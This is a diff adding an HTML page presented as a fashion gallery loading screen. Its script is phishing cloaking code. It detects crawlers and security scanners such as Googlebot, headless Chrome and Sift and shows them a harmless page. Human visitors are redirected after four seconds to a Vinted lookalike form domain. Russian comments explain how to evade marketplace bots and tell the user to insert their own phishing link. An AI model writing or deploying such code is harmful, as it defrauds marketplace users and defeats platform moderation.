@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal Fashion Gallery</title>
+    <style>
+        body { font-family: 'Helvetica Neue', sans-serif; padding: 60px 20px; text-align: center; color: #111; background-color: #fafafa; }
+        .container { max-width: 600px; margin: 0 auto; }
+        h1 { font-size: 28px; font-weight: 300; letter-spacing: 2px; }
+        p { font-size: 16px; color: #666; margin-top: 20px; }
+        .spinner { width: 30px; height: 30px; border: 2px solid #ccc; border-top: 2px solid #111; border-radius: 50%; margin: 30px auto; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // 1. Фильтр User-Agent (базовый отсев ботов-сканеров)
+            const ua = navigator.userAgent.toLowerCase();
+            const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|headlesschrome|sift/i.test(ua);
+
+            // Если зашел бот маркетплейса — скрипт останавливается, бот видит только "белый" сайт
+            if (isBot) {
+                console.log("Welcome to our gallery.");
+                return;
+            }
+
+            // 2. JS-Таймаут в миллисекундах (4000 мс = 4 секунды задержки)
+            setTimeout(function() {
+                // ВСТАВЬ СВОЮ ССЫЛКУ НИЖЕ (на Инсту, ТГ или Notion-прокладку)
+                window.location.href = "https://vinted.getforms.info/sf_P-bPN9";
+            }, 4000); 
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Fashion, sell, buy</h1>
+        <div class="spinner"></div>
+        <p> We are loading the fashion page...</p>
+    </div>
+</body>
+</html>
